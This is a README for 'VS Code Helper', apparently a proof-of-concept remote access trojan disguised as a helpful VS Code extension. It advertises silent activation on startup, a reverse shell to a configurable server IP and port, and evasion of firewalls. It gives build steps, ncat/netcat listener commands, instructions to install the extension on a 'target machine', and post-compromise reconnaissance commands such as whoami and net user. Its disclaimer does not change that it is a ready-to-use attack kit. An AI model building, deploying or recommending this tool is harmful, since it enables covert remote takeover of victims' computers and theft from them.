```markdown
# VS Code Helper

Remote administration tool for VS Code. Provides system command execution through VS Code extension.

![VS Code Helper](screenshots/extension.png)

---

## Features

- Silent activation on VS Code startup
- Reverse shell with bidirectional communication
- Works through firewalls (uses outbound TCP)
- No admin privileges required
- No persistent files or registry changes
- Clean uninstall via VS Code extensions panel

---

## Installation

### 1. Download extension

Download `vscode-helper-1.0.0.vsix` from [Releases](https://github.com/cyberdark16/VScode-Helper-PoC/releases)

### 2. Install in VS Code

```bash
code --install-extension vscode-helper-1.0.0.vsix
```

### 3. Reload VS Code

Press `Ctrl+Shift+P` → type `Reload Window` → Enter

---

## Configuration (before building)

Edit `extension.js` and change server IP:

```javascript
const SERVER_IP = "127.0.0.1";  // Change to your server IP
const SERVER_PORT = 4444;        // Change port if needed
```

---

## Building from source

```bash
npm install
npm install -g vsce
vsce package --allow-missing-repository
```

---

## Server Setup

### Option 1: Ncat (Windows)

```bash
ncat -lvnp 4444 --keep-open
```

### Option 2: Python server

```bash
python server.py
```

### Option 3: Netcat (Linux)

```bash
nc -lvnp 4444
```

---

## Usage

### 1. Start listener on your server

```bash
ncat -lvnp 4444 --keep-open
```

### 2. Install extension on target machine

Extension activates automatically when VS Code starts.

### 3. Connection appears in listener terminal

```
Ncat: Connection from 192.168.1.100:54321
Microsoft Windows [Version 10.0.22621.6060]
(c) Microsoft Corporation. All rights reserved.

C:\Users\User>
```

### 4. Execute system commands

```
dir
whoami
ipconfig
systeminfo
tasklist
net user
calc
notepad
exit
```

---

## Commands Reference

| Command | Description |
|---------|-------------|
| `dir` | List directory contents |
| `whoami` | Show current user |
| `ipconfig` | Network configuration |
| `systeminfo` | System information |
| `tasklist` | Running processes |
| `net user` | List users |
| `calc` | Run calculator |
| `notepad` | Open notepad |
| `exit` | Close connection |

---

## Screenshots

### Server Listener

![Server listener](screenshots/server.png)

### Command Execution

![Command execution](screenshots/commands.png)

### Extension in VS Code

![Extension in VS Code](screenshots/extension.png)

---

## Uninstall

### Command line

```bash
code --uninstall-extension publisher.vscode-helper
```

### VS Code UI

1. Open VS Code
2. Press `Ctrl+Shift+X` (Extensions)
3. Find `VS Code Helper`
4. Click Uninstall

---

## Files Structure

```
vscode-helper/
├── extension.js          # Main extension code
├── package.json          # Extension manifest
├── README.md             # Documentation
└── .gitignore            # Git ignore rules
```

---

## Security Notes

- Extension runs with user privileges
- No data stored locally
- Connection only to configured IP/port
- Can be blocked by corporate firewall
- Use at your own risk

---

## License

MIT License

---

## Disclaimer

This tool is for educational and authorized testing purposes only. Use only on systems you own or have explicit permission to test. The author is not responsible for any misuse.
```

---
